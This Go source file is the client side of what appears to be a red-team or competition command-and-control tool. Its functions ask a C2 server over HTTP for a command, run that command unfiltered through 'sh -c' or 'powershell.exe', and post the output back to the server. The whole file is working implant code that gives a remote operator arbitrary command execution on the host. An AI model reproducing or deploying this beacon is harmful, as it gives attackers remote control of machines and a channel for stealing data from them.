package client

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"time"

	"github.com/picatz/i2bn/callback"
)

var httpClient = &http.Client{
	Transport: &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
		MaxIdleConns:          1000,
		IdleConnTimeout:       30 * time.Second,
		TLSHandshakeTimeout:   30 * time.Second,
		ExpectContinueTimeout: 30 * time.Second,
		MaxIdleConnsPerHost:   runtime.GOMAXPROCS(0) + 1,
	},
}

func reqCommandFromC2(ctx context.Context, url, ip, user, team string) (string, string, error) {
	// request command from c2
	reqBody := callback.CommandRequest{
		IP:   ip,
		Team: team,
		User: user,
	}

	b, err := json.Marshal(reqBody)
	if err != nil {
		return "", "", err
	}

	req, err := http.NewRequest("PUT", url, bytes.NewReader(b))
	if err != nil {
		return "", "", err
	}

	req = req.WithContext(ctx)

	resp, err := httpClient.Do(req)
	if err != nil {
		return "", "", err
	}

	cbResp := &callback.Response{}

	err = json.NewDecoder(resp.Body).Decode(cbResp)
	if err != nil {
		return "", "", err
	}

	if cbResp.IsError() {
		return "", "", fmt.Errorf("%v", cbResp.Error)
	}

	return cbResp.ID, cbResp.Command, nil
}

func runCommandFromC2(ctx context.Context, cmdStr string) (string, error) {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("powershell.exe", "-Command", "-", cmdStr)
	default:
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	log.Println(cmd.String())

	output, err := cmd.CombinedOutput()
	if err != nil {
		if output != nil {
			fmt.Println(string(output))
		}
		return "", err
	}

	return string(output), nil
}

func sendCommandToC2(ctx context.Context, url, id, output string) error {
	// request command from c2
	reqBody := callback.CommandResultsRequest{
		ID:      id,
		Results: output,
	}

	b, err := json.Marshal(reqBody)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(b))
	if err != nil {
		return err
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}

	cbResp := &callback.Response{}

	err = json.NewDecoder(resp.Body).Decode(cbResp)
	if err != nil {
		return err
	}

	if cbResp.IsError() {
		return fmt.Errorf("%v", cbResp.Error)
	}

	return nil
}

func GetDemPoints(ctx context.Context, url, ip, team, user string) error {
	log.Println("requesting command from c2")
	// get the command from the c2
	id, cmd, err := reqCommandFromC2(ctx, url, ip, user, team)
	if err != nil {
		return err
	}

	log.Printf("running command from c2 cmd=%q", cmd)
	// run the command from the c2
	output, err := runCommandFromC2(ctx, cmd)
	if err != nil {
		return err
	}
	log.Printf("cmd=%q result=%q", cmd, string(output))

	// send the result back
	req2body := callback.CommandResultsRequest{
		ID:      id,
		Results: string(output),
	}

	req2bodyBytes, err := json.Marshal(req2body)
	if err != nil {
		return err
	}

	log.Println("posting results c2")
	req2, err := http.NewRequest("POST", url, bytes.NewReader(req2bodyBytes))
	if err != nil {
		return err
	}

	_, err = httpClient.Do(req2)
	if err != nil {
		return err
	}

	log.Println("successfully posted to c2")

	return nil
}
